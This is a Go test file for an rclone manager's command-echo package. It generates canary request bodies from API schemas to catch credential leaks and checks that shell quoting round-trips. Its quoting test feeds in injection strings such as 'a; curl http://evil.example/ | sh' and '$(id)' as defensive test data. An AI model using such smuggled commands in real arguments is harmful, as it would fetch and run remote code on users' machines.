package cliecho

import (
	"encoding/json"
	"reflect"
	"sort"
	"strings"
	"testing"

	"github.com/spdrman/rclone-manager/core/apicontract"
)

// The corpus two tests in this package are driven with: one request body
// per contract schema, with EVERY string field on it, at every depth,
// carrying a value chosen by the caller.
//
// It is generated from apicontract.SchemaTypes rather than written out,
// and that is the whole point. A hand-written body carries the fields
// whoever wrote it was thinking about, which is exactly how a
// credential-leak test that named eight fields by hand stayed green while
// two real leaks (an endpoint URL's userinfo and a credentials command)
// walked past it: neither field was in the list, and nothing about the
// list said what it was missing. A schema added to the contract cannot go
// unvisited here, because the map this walks is the generator's own.

// canaryBody is one request body, plus the schema it was built from, so a
// failure says which shape produced it.
type canaryBody struct {
	schema string
	body   []byte
}

// canaryBodies builds one body per contract schema. value is given the
// field's path ("StorageMediumRequest.credentials.command[0]") and returns
// what that string field should carry.
//
// Numbers are filled with a small positive value and booleans with true,
// because a builder that only emits a flag when a number is positive or a
// flag is set would otherwise be walked with every one of those branches
// switched off, and a body that reaches no flag proves nothing about the
// flags.
func canaryBodies(t *testing.T, value func(path string) string) []canaryBody {
	t.Helper()
	names := make([]string, 0, len(apicontract.SchemaTypes))
	for name := range apicontract.SchemaTypes {
		names = append(names, name)
	}
	sort.Strings(names)

	out := make([]canaryBody, 0, len(names))
	for _, name := range names {
		typ := reflect.TypeOf(apicontract.SchemaTypes[name])
		if typ == nil || typ.Kind() != reflect.Struct {
			continue
		}
		filled := fillCanaries(typ, name, value, 0)
		body, err := json.Marshal(filled.Interface())
		if err != nil {
			t.Fatalf("marshalling a canary %s: %v", name, err)
		}
		for _, variant := range bodyVariants(name, body) {
			out = append(out, canaryBody{schema: name, body: variant})
		}
	}
	if len(out) == 0 {
		t.Fatal("the contract offered no schemas at all, so every test driven from this corpus would pass having checked nothing")
	}
	return out
}

// bodyVariants is where a field whose VALUE selects a code path gets real
// values rather than a canary.
//
// SubmitOperationRequest.action is the only one: it names which of the
// parameter objects the request carries, and a body whose action is a
// canary string reaches no arm of that switch at all. A test driven only
// by such a body would report that no builder printed a canary, which is
// true and worthless. So this expands that one schema into one body per
// action the contract actually defines.
func bodyVariants(schema string, body []byte) [][]byte {
	if schema != "SubmitOperationRequest" {
		return [][]byte{body}
	}
	var decoded map[string]any
	if err := json.Unmarshal(body, &decoded); err != nil {
		return [][]byte{body}
	}
	out := make([][]byte, 0, 3)
	for _, action := range []string{
		apicontract.ActionRunCycle,
		apicontract.ActionRunBackupSet,
		apicontract.ActionRestorePlacement,
	} {
		decoded["action"] = action
		encoded, err := json.Marshal(decoded)
		if err != nil {
			continue
		}
		out = append(out, encoded)
	}
	return out
}

// fillCanaries builds a value of typ with every string in it set by value.
//
// The depth bound is a guard rather than a rule about this contract: a
// schema that referred to itself would otherwise recurse forever, and a
// test that hangs is harder to read than one that stops.
func fillCanaries(typ reflect.Type, path string, value func(string) string, depth int) reflect.Value {
	v := reflect.New(typ).Elem()
	if depth > 6 {
		return v
	}
	switch typ.Kind() {
	case reflect.String:
		v.SetString(value(path))
	case reflect.Bool:
		v.SetBool(true)
	case reflect.Int, reflect.Int8, reflect.Int16, reflect.Int32, reflect.Int64:
		v.SetInt(7)
	case reflect.Uint, reflect.Uint8, reflect.Uint16, reflect.Uint32, reflect.Uint64:
		v.SetUint(7)
	case reflect.Float32, reflect.Float64:
		v.SetFloat(7)
	case reflect.Pointer:
		v.Set(reflect.New(typ.Elem()))
		v.Elem().Set(fillCanaries(typ.Elem(), path, value, depth+1))
	case reflect.Slice:
		elem := fillCanaries(typ.Elem(), path+"[0]", value, depth+1)
		v.Set(reflect.Append(reflect.MakeSlice(typ, 0, 1), elem))
	case reflect.Struct:
		for i := 0; i < typ.NumField(); i++ {
			field := typ.Field(i)
			if !field.IsExported() {
				continue
			}
			name := strings.Split(field.Tag.Get("json"), ",")[0]
			if name == "" {
				name = field.Name
			}
			if name == "-" {
				continue
			}
			v.Field(i).Set(fillCanaries(field.Type, path+"."+name, value, depth+1))
		}
	}
	return v
}

// splitShell reads one rendered command line back into the words a shell
// would hand a process.
//
// It reads exactly the two things shellQuote emits, a bare word and a
// single-quoted string with a backslash-escaped quote standing in for an
// embedded one, and nothing else. That narrowness is deliberate: this is the reader that
// decides whether a rendered line means what the argv meant, so it has to
// be a reader of the shell's rules rather than a second copy of the
// writer's.
func splitShell(s string) []string {
	var (
		out    []string
		cur    strings.Builder
		inWord bool
		quoted bool
	)
	flush := func() {
		if inWord {
			out = append(out, cur.String())
			cur.Reset()
			inWord = false
		}
	}
	for i := 0; i < len(s); i++ {
		c := s[i]
		switch {
		case quoted:
			if c == '\'' {
				quoted = false
				continue
			}
			cur.WriteByte(c)
		case c == '\'':
			quoted, inWord = true, true
		case c == ' ' || c == '\t' || c == '\n':
			flush()
		case c == '\\':
			if i+1 < len(s) {
				i++
				cur.WriteByte(s[i])
				inWord = true
			}
		default:
			cur.WriteByte(c)
			inWord = true
		}
	}
	flush()
	return out
}

// TestSplitShellReadsWhatShellQuoteWrites is splitShell's own control.
// Every quoting assertion in this package is made through it, so a reader
// that quietly agreed with the writer would make all of them vacuous.
func TestSplitShellReadsWhatShellQuoteWrites(t *testing.T) {
	for _, arg := range []string{
		"plain",
		"",
		"with space",
		"a; curl http://evil.example/ | sh",
		"it's quoted",
		"<not a placeholder>",
		`back\slash`,
		"tab\there",
		"*.gz,*.sql",
		"$(id)",
		"10.0.0.14 ssh-ed25519 AAAAC3Nz",
	} {
		got := splitShell(shellQuote(arg))
		if len(got) != 1 || got[0] != arg {
			t.Errorf("shellQuote(%q) = %q, which reads back as %q rather than one word; every quoting claim in this package is made through this reader, so it has to be able to see a mistake", arg, shellQuote(arg), got)
		}
	}

	// And the reader is not simply returning what it was given: a line
	// that was NOT quoted comes back as several words.
	if got := splitShell("a; curl http://evil.example/ | sh"); len(got) < 2 {
		t.Fatalf("an unquoted line with spaces in it reads back as %q, so this reader could never tell quoted from unquoted", got)
	}
}
